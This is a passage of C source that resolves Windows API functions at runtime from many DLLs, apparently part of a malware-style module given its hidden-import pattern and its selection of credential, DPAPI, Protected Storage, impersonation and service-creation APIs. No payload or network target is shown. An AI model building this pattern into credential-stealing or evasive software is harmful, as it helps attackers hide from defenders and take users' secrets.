    DECLARE_SYSTEM_FUNC(RegOpenKeyA, moduleBase);
#endif
#ifdef fn_RegEnumValueA
    DECLARE_SYSTEM_FUNC(RegEnumValueA, moduleBase);
#endif 
#ifdef fn_RegOpenKeyW
    DECLARE_SYSTEM_FUNC(RegOpenKeyW, moduleBase);
#endif
#ifdef fn_CredEnumerateW
    DECLARE_SYSTEM_FUNC(CredEnumerateW, moduleBase);
#endif
#ifdef fn_CredEnumerateA
    DECLARE_SYSTEM_FUNC(CredEnumerateA, moduleBase);
#endif
#ifdef fn_CredFree
    DECLARE_SYSTEM_FUNC(CredFree, moduleBase);
#endif
#ifdef fn_GetUserNameW
    DECLARE_SYSTEM_FUNC(GetUserNameW, moduleBase);
#endif
#ifdef fn_RevertToSelf
    DECLARE_SYSTEM_FUNC(RevertToSelf, moduleBase);
#endif
#ifdef fn_ImpersonateLoggedOnUser
    DECLARE_SYSTEM_FUNC(ImpersonateLoggedOnUser, moduleBase);
#endif
#ifdef fn_CryptGetUserKey
    DECLARE_SYSTEM_FUNC(CryptGetUserKey, moduleBase);
#endif
#ifdef fn_CryptExportKey
    DECLARE_SYSTEM_FUNC(CryptExportKey, moduleBase);
#endif
#ifdef fn_CryptDestroyKey
    DECLARE_SYSTEM_FUNC(CryptDestroyKey, moduleBase);
#endif
#ifdef fn_CryptAcquireContextW
	DECLARE_SYSTEM_FUNC(CryptAcquireContextW, moduleBase);
#endif
#ifdef fn_CryptReleaseContext
    DECLARE_SYSTEM_FUNC(CryptReleaseContext, moduleBase);
#endif
#ifdef fn_CryptCreateHash
	DECLARE_SYSTEM_FUNC(CryptCreateHash, moduleBase);
#endif
#ifdef fn_CryptHashData
	DECLARE_SYSTEM_FUNC(CryptHashData, moduleBase);
#endif
#ifdef fn_CryptGetHashParam
	DECLARE_SYSTEM_FUNC(CryptGetHashParam, moduleBase);
#endif
#ifdef fn_CryptDestroyHash
	DECLARE_SYSTEM_FUNC(CryptDestroyHash, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(CryptGenRandom, moduleBase);
#ifdef fn_RegOpenCurrentUser
	DECLARE_SYSTEM_FUNC(RegOpenCurrentUser, moduleBase);
#endif
#ifdef fn_OpenSCManagerW
	DECLARE_SYSTEM_FUNC(OpenSCManagerW, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(CreateServiceW, moduleBase);
    DECLARE_SYSTEM_FUNC(ChangeServiceConfigW, moduleBase);
#ifdef fn_EnumServicesStatusW
	DECLARE_SYSTEM_FUNC(EnumServicesStatusW, moduleBase);
#endif
#ifdef fn_CloseServiceHandle
	DECLARE_SYSTEM_FUNC(CloseServiceHandle, moduleBase);
#endif
#ifdef fn_OpenServiceW
	DECLARE_SYSTEM_FUNC(OpenServiceW, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(StartServiceW, moduleBase);
    DECLARE_SYSTEM_FUNC(QueryServiceStatus, moduleBase);
#ifdef fn_QueryServiceConfigW
	DECLARE_SYSTEM_FUNC(QueryServiceConfigW, moduleBase);
#endif
#ifdef fn_I_QueryTagInformation
	DECLARE_SYSTEM_FUNC(I_QueryTagInformation, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(StartServiceCtrlDispatcherW, moduleBase);
    DECLARE_SYSTEM_FUNC(RegisterServiceCtrlHandlerW, moduleBase);
    DECLARE_SYSTEM_FUNC(SetServiceStatus, moduleBase);

#endif // FUNCS_ADVAPI32

#ifdef FUNCS_SHELL32
    // shell32.dll
    moduleBase = fn_LoadLibraryA("shell32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get shell32.dll base (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("shell32.dll module base = %08x", moduleBase);
#ifdef fn_ShellExecuteExW
    DECLARE_SYSTEM_FUNC(ShellExecuteExW, moduleBase);
#endif
#ifdef fn_SHCreateItemFromParsingName
    DECLARE_SYSTEM_FUNC(SHCreateItemFromParsingName, moduleBase);
#endif
#ifdef fn_SHGetSpecialFolderPathW
    DECLARE_SYSTEM_FUNC(SHGetSpecialFolderPathW, moduleBase);
#endif
#ifdef fn_SHGetFolderPathW
    DECLARE_SYSTEM_FUNC(SHGetFolderPathW, moduleBase);
#endif
#ifdef fn_Shell_NotifyIconW
	DECLARE_SYSTEM_FUNC(Shell_NotifyIconW, moduleBase);
#endif
#ifdef fn_SHGetFileInfoW
	DECLARE_SYSTEM_FUNC(SHGetFileInfoW, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(SHGetKnownFolderPath, moduleBase);

#endif // FUNCS_SHELL32

#ifdef FUNCS_OLE32
    moduleBase = fn_LoadLibraryA("ole32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of ole32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("ole32.dll module base = %08x", moduleBase);
#ifdef fn_CoInitialize
    DECLARE_SYSTEM_FUNC(CoInitialize, moduleBase);
#endif
#ifdef fn_CoInitializeEx
    DECLARE_SYSTEM_FUNC(CoInitializeEx, moduleBase);
#endif
#ifdef fn_CoUninitialize
    DECLARE_SYSTEM_FUNC(CoUninitialize, moduleBase);
#endif
#ifdef fn_CoGetObject
    DECLARE_SYSTEM_FUNC(CoGetObject, moduleBase);
#endif
#ifdef fn_CoCreateInstance
    DECLARE_SYSTEM_FUNC(CoCreateInstance, moduleBase);
#endif
#ifdef fn_CreateStreamOnHGlobal
    DECLARE_SYSTEM_FUNC(CreateStreamOnHGlobal, moduleBase);
#endif
#ifdef fn_GetRunningObjectTable
    DECLARE_SYSTEM_FUNC(GetRunningObjectTable, moduleBase);
#endif
#ifdef fn_CreateItemMoniker
    DECLARE_SYSTEM_FUNC(CreateItemMoniker, moduleBase);
#endif
#ifdef fn_CoTaskMemFree
    DECLARE_SYSTEM_FUNC(CoTaskMemFree, moduleBase);
#endif
#ifdef fn_IsEqualGUID
    DECLARE_SYSTEM_FUNC(IsEqualGUID, moduleBase);
#endif
#ifdef fn_GetHGlobalFromStream
    DECLARE_SYSTEM_FUNC(GetHGlobalFromStream, moduleBase);
#endif
#ifdef fn_StgOpenStorage
    DECLARE_SYSTEM_FUNC(StgOpenStorage, moduleBase);
#endif
#ifdef fn_OleInitialize
    DECLARE_SYSTEM_FUNC(OleInitialize, moduleBase);
#endif
#ifdef fn_OleUninitialize
    DECLARE_SYSTEM_FUNC(OleUninitialize, moduleBase);
#endif
#ifdef fn_CoInitializeSecurity
	DECLARE_SYSTEM_FUNC(CoInitializeSecurity, moduleBase);
#endif
#ifdef fn_CoSetProxyBlanket
	DECLARE_SYSTEM_FUNC(CoSetProxyBlanket, moduleBase);
#endif
#ifdef fn_CLSIDFromString
	DECLARE_SYSTEM_FUNC(CLSIDFromString, moduleBase);
#endif
#ifdef fn_CLSIDFromProgID
	DECLARE_SYSTEM_FUNC(CLSIDFromProgID, moduleBase);
#endif
#ifdef fn_OleLockRunning
	DECLARE_SYSTEM_FUNC(OleLockRunning, moduleBase);
#endif
	
#endif // FUNCS_OLE32

#ifdef FUNCS_WINHTTP
    // winhttp.dll
    moduleBase = fn_LoadLibraryA("winhttp.dll");
    if (moduleBase == NULL) {
		LOG("Can't Get winhttp address (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("Winhttp Module Addr = %08x", moduleBase);
#ifdef fn_WinHttpCloseHandle
    DECLARE_SYSTEM_FUNC(WinHttpCloseHandle, moduleBase);
#endif
#ifdef fn_WinHttpOpen
    DECLARE_SYSTEM_FUNC(WinHttpOpen, moduleBase);
#endif
#ifdef fn_WinHttpOpenRequest
    DECLARE_SYSTEM_FUNC(WinHttpOpenRequest, moduleBase);
#endif
#ifdef fn_WinHttpCrackUrl
    DECLARE_SYSTEM_FUNC(WinHttpCrackUrl, moduleBase);
#endif
#ifdef fn_WinHttpConnect
    DECLARE_SYSTEM_FUNC(WinHttpConnect, moduleBase);
#endif
#ifdef fn_WinHttpQueryHeaders
    DECLARE_SYSTEM_FUNC(WinHttpQueryHeaders, moduleBase);
#endif
#ifdef fn_WinHttpReceiveResponse
    DECLARE_SYSTEM_FUNC(WinHttpReceiveResponse, moduleBase);
#endif
#ifdef fn_WinHttpSendRequest
    DECLARE_SYSTEM_FUNC(WinHttpSendRequest, moduleBase);
#endif
#ifdef fn_WinHttpSetOption
    DECLARE_SYSTEM_FUNC(WinHttpSetOption, moduleBase);
#endif
#ifdef fn_WinHttpSetTimeouts
    DECLARE_SYSTEM_FUNC(WinHttpSetTimeouts, moduleBase);
#endif
#ifdef fn_WinHttpQueryDataAvailable
    DECLARE_SYSTEM_FUNC(WinHttpQueryDataAvailable, moduleBase);
#endif
#ifdef fn_WinHttpReadData
    DECLARE_SYSTEM_FUNC(WinHttpReadData, moduleBase);
#endif
#ifdef fn_WinHttpWriteData
    DECLARE_SYSTEM_FUNC(WinHttpWriteData, moduleBase);
#endif
#ifdef fn_WinHttpAddRequestHeaders
    DECLARE_SYSTEM_FUNC(WinHttpAddRequestHeaders, moduleBase);
#endif
#ifdef fn_WinHttpGetIEProxyConfigForCurrentUser
    DECLARE_SYSTEM_FUNC(WinHttpGetIEProxyConfigForCurrentUser, moduleBase);
#endif
#ifdef fn_WinHttpGetProxyForUrl
    DECLARE_SYSTEM_FUNC(WinHttpGetProxyForUrl, moduleBase);
#endif
    
#endif // FUNCS_WINHTTP

     // Iphlpapi.dll
	moduleBase = fn_LoadLibraryA("Iphlpapi.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of Iphlpapi.dll (error: %08x)", fn_GetLastError());
        return 0;
     }
	LOG("Iphlpapi.dll module base = ", moduleBase);
#ifdef fn_GetExtendedTcpTable
	DECLARE_SYSTEM_FUNC(GetExtendedTcpTable, moduleBase);
#endif
#ifdef fn_GetExtendedUdpTable
	DECLARE_SYSTEM_FUNC(GetExtendedUdpTable, moduleBase);
#endif

#ifdef FUNCS_PSAPI
    // psapi.dll
    moduleBase = fn_LoadLibraryA("psapi.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of psapi.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("psapi.dll module base = %08x", moduleBase);
#ifdef fn_EnumProcessModules
    DECLARE_SYSTEM_FUNC(EnumProcessModules, moduleBase);
#endif
#ifdef fn_GetProcessImageFileNameW
    DECLARE_SYSTEM_FUNC(GetProcessImageFileNameW, moduleBase);
#endif
#ifdef fn_GetModuleFileNameExW
	DECLARE_SYSTEM_FUNC(GetModuleFileNameExW, moduleBase);
#endif
#ifdef fn_GetModuleBaseNameW
	DECLARE_SYSTEM_FUNC(GetModuleBaseNameW, moduleBase);
#endif
#ifdef fn_GetProcessMemoryInfo
	DECLARE_SYSTEM_FUNC(GetProcessMemoryInfo, moduleBase);
#endif
#endif // FUNCS_PSAPI

#ifdef FUNCS_IMAGEHLP
    // imagehlp.dll
    moduleBase = fn_LoadLibraryA("imagehlp.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of imagehlp.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("imagehlp.dll module base = %08x", moduleBase);
#ifdef fn_CheckSumMappedFile
    DECLARE_SYSTEM_FUNC(CheckSumMappedFile, moduleBase);
#endif
#endif // FUNCS_IMAGEHLP

#ifdef FUNCS_WINMM
    // winmm.dll
    moduleBase = fn_LoadLibraryA("winmm.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of winmm.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("winmm.dll module base = %08x", moduleBase);

#ifdef fn_timeGetTime
    DECLARE_SYSTEM_FUNC(timeGetTime, moduleBase);
#endif
#endif // FUNCS_WINMM

#ifdef FUNCS_MSIMG32
    // msimg32.dll
    moduleBase = fn_LoadLibraryA("msimg32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of msimg32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("msimg32.dll module base = %08x", moduleBase);

#ifdef fn_AlphaBlend
    DECLARE_SYSTEM_FUNC(AlphaBlend, moduleBase);
#endif
#ifdef fn_GradientFill
    DECLARE_SYSTEM_FUNC(GradientFill, moduleBase);
#endif

#endif // FUNCS_MSIMG32


#ifdef FUNCS_WS2_32
    // ws2_32.dll
    moduleBase = fn_LoadLibraryA("ws2_32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of ws2_32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("ws2_32.dll module base = %08x", moduleBase);
#ifdef fn_WSAStartup
    DECLARE_SYSTEM_FUNC(WSAStartup, moduleBase);
#endif
#ifdef fn_WSACleanup
    DECLARE_SYSTEM_FUNC(WSACleanup, moduleBase);
#endif
#ifdef fn_WSAGetLastError
    DECLARE_SYSTEM_FUNC(WSAGetLastError, moduleBase);
#endif
#ifdef fn_socket
    DECLARE_SYSTEM_FUNC(socket, moduleBase);
#endif
#ifdef fn_gethostbyname
    DECLARE_SYSTEM_FUNC(gethostbyname, moduleBase);
#endif
#ifdef fn_getaddrinfo
    DECLARE_SYSTEM_FUNC(getaddrinfo, moduleBase);
#endif
#ifdef fn_freeaddrinfo
    DECLARE_SYSTEM_FUNC(freeaddrinfo, moduleBase);
#endif
#ifdef fn_setsockopt
    DECLARE_SYSTEM_FUNC(setsockopt, moduleBase);
#endif
#ifdef fn_getsockopt
    DECLARE_SYSTEM_FUNC(getsockopt, moduleBase);
#endif
#ifdef fn_htons
    DECLARE_SYSTEM_FUNC(htons, moduleBase);
#endif
#ifdef fn_select
    DECLARE_SYSTEM_FUNC(select, moduleBase);
#endif
#ifdef fn_ntohl
    DECLARE_SYSTEM_FUNC(ntohl, moduleBase);
#endif
#ifdef fn_connect
    DECLARE_SYSTEM_FUNC(connect, moduleBase);
#endif
#ifdef fn_ioctlsocket
    DECLARE_SYSTEM_FUNC(ioctlsocket, moduleBase);
#endif
#ifdef fn_closesocket
    DECLARE_SYSTEM_FUNC(closesocket, moduleBase);
#endif
#ifdef fn_shutdown
    DECLARE_SYSTEM_FUNC(shutdown, moduleBase);
#endif
#ifdef fn_send
    DECLARE_SYSTEM_FUNC(send, moduleBase);
#endif
#ifdef fn_recv
    DECLARE_SYSTEM_FUNC(recv, moduleBase);
#endif
#ifdef fn___WSAFDIsSet
    DECLARE_SYSTEM_FUNC(__WSAFDIsSet, moduleBase);
#endif
#ifdef fn_inet_addr
    DECLARE_SYSTEM_FUNC(inet_addr, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(WSAIoctl, moduleBase);
    DECLARE_SYSTEM_FUNC(WSASetLastError, moduleBase);
    DECLARE_SYSTEM_FUNC(GetAddrInfoW, moduleBase);
    DECLARE_SYSTEM_FUNC(GetNameInfoW, moduleBase);
    DECLARE_SYSTEM_FUNC(WSASocketW, moduleBase);
    DECLARE_SYSTEM_FUNC(bind, moduleBase);
    DECLARE_SYSTEM_FUNC(WSARecv, moduleBase);
    DECLARE_SYSTEM_FUNC(getsockname, moduleBase);
    DECLARE_SYSTEM_FUNC(getpeername, moduleBase);
    DECLARE_SYSTEM_FUNC(WSASend, moduleBase);
    DECLARE_SYSTEM_FUNC(listen, moduleBase);
    DECLARE_SYSTEM_FUNC(WSADuplicateSocketW, moduleBase);
    DECLARE_SYSTEM_FUNC(WSASendTo, moduleBase);
    DECLARE_SYSTEM_FUNC(WSARecvFrom, moduleBase);
    DECLARE_SYSTEM_FUNC(htonl, moduleBase);
    DECLARE_SYSTEM_FUNC(FreeAddrInfoW, moduleBase);

#endif // FUNCS_WS2_32

#ifdef FUNCS_OLEAUT32

    // oleaut32.dll
    moduleBase = fn_LoadLibraryA("oleaut32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of oleaut32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("oleaut32.dll module base = %08x", moduleBase);
#ifdef fn_SysAllocString
    DECLARE_SYSTEM_FUNC(SysAllocString, moduleBase);
#endif
#ifdef fn_SysFreeString
    DECLARE_SYSTEM_FUNC(SysFreeString, moduleBase);
#endif
#ifdef fn_VariantInit
    DECLARE_SYSTEM_FUNC(VariantInit, moduleBase);
#endif
#ifdef fn_VariantChangeType
    DECLARE_SYSTEM_FUNC(VariantChangeType, moduleBase);
#endif
#ifdef fn_VariantClear
    DECLARE_SYSTEM_FUNC(VariantClear, moduleBase);
#endif

#endif // FUNCS_OLEAUT32

#ifdef FUNCS_CRYPT32

    // crypt32.dll
    moduleBase = fn_LoadLibraryA("crypt32.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of crypt32.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("crypt32.dll module base = %08x", moduleBase);
#ifdef fn_CryptUnprotectData
    DECLARE_SYSTEM_FUNC(CryptUnprotectData, moduleBase);
#endif
#ifdef fn_CertOpenSystemStoreW
    DECLARE_SYSTEM_FUNC(CertOpenSystemStoreW, moduleBase);
#endif
#ifdef fn_CertEnumCertificatesInStore
    DECLARE_SYSTEM_FUNC(CertEnumCertificatesInStore, moduleBase);
#endif
#ifdef fn_CryptAcquireCertificatePrivateKey
    DECLARE_SYSTEM_FUNC(CryptAcquireCertificatePrivateKey, moduleBase);
#endif
#ifdef fn_CertCloseStore
    DECLARE_SYSTEM_FUNC(CertCloseStore, moduleBase);
#endif
#endif // FUNCS_CRYPT32

#ifdef FUNCS_PSTOREC

    // pstorec.dll
    moduleBase = fn_LoadLibraryA("pstorec.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of pstorec.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("pstorec.dll module base = %08x", moduleBase);
#ifdef fn_PStoreCreateInstance
    DECLARE_SYSTEM_FUNC(PStoreCreateInstance, moduleBase);
#endif

#endif // FUNCS_PSTOREC

#ifdef FUNCS_MSI

    // msi.dll
    moduleBase = fn_LoadLibraryA("msi.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of msi.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("msi.dll module base = %08x", moduleBase);
#ifdef fn_MsiGetComponentPathW
    DECLARE_SYSTEM_FUNC(MsiGetComponentPathW, moduleBase);
#endif

#endif // FUNCS_MSI

#ifdef FUNCS_WININET
    // wininet.dll
    moduleBase = fn_LoadLibraryA("wininet.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of wininet.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("wininet.dll module base = %08x", moduleBase);
#ifdef fn_InternetCrackUrlA
    DECLARE_SYSTEM_FUNC(InternetCrackUrlA, moduleBase);
#endif

#ifdef fn_InternetCreateUrlA
    DECLARE_SYSTEM_FUNC(InternetCreateUrlA, moduleBase);
#endif

#endif // FUNCS_WININET

#ifdef FUNCS_IPHLPAPI

    // iphlpapi.dll
    moduleBase = fn_LoadLibraryA("iphlpapi.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of iphlpapi.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("iphlpapi.dll module base = %08x", moduleBase);
#ifdef fn_GetAdaptersInfo
    DECLARE_SYSTEM_FUNC(GetAdaptersInfo, moduleBase);
#endif
    DECLARE_SYSTEM_FUNC(GetAdaptersAddresses, moduleBase);

#endif // FUNCS_IPHLPAPI

#ifdef FUNCS_URLMON

    // urlmon.dll
    moduleBase = fn_LoadLibraryA("urlmon.dll");
    if (moduleBase == NULL) {
		LOG("Can't get base of urlmon.dll (error: %08x)", fn_GetLastError());
        return 0;
    }
	LOG("urlmon.dll module base = %08x", moduleBase);
#ifdef fn_ObtainUserAgentString
    DECLARE_SYSTEM_FUNC(ObtainUserAgentString, moduleBase);
#endif

#endif // FUNCS_URLMON

#ifdef FUNCS_VERSION

	// version.dll
	moduleBase = fn_LoadLibraryA("version.dll");
	if (moduleBase == NULL) {
		LOG("Can't get base of version.dll (error: %08x)", fn_GetLastError());
		return 0;
	}
	LOG("version.dll module base = %08x", moduleBase);
#ifdef fn_GetFileVersionInfoSizeW
	DECLARE_SYSTEM_FUNC(GetFileVersionInfoSizeW, moduleBase);
#endif
#ifdef fn_GetFileVersionInfoW
	DECLARE_SYSTEM_FUNC(GetFileVersionInfoW, moduleBase);
#endif
#ifdef fn_VerQueryValueW
	DECLARE_SYSTEM_FUNC(VerQueryValueW, moduleBase);
#endif

#endif // FUNCS_VERSION

#ifdef FUNCS_CRTDLL

	// crtdll.dll
	moduleBase = fn_LoadLibraryA("crtdll.dll");
	if (moduleBase == NULL) {
		LOG("Can't get base of crtdll.dll (error: %08x)", fn_GetLastError());
		return 0;
	}
	LOG("crtdll.dll module base = %08x", moduleBase);
#ifdef fn_atof
	DECLARE_SYSTEM_FUNC(atof, moduleBase);
#endif
#ifdef fn_cos
	DECLARE_SYSTEM_FUNC(cos, moduleBase);
#endif
#ifdef fn_sin
	DECLARE_SYSTEM_FUNC(sin, moduleBase);
#endif
#ifdef fn_abs
	DECLARE_SYSTEM_FUNC(abs, moduleBase);
#endif

#endif // FUNCS_CRTDLL

#ifdef FUNCS_D3D9

	// d3d9.dll
	moduleBase = fn_LoadLibraryA("d3d9.dll");
	if (moduleBase == NULL) {
		LOG("Can't get base of d3d9.dll (error: %08x)", fn_GetLastError());
		return 0;
	}
	LOG("d3d9.dll module base = %08x", moduleBase);
#ifdef fn_Direct3DCreate9
	DECLARE_SYSTEM_FUNC(Direct3DCreate9, moduleBase);
#endif

#endif // FUNCS_D3D9

	_pZmoduleBlock->allFuncsLoaded = 1;

    return 1;
}
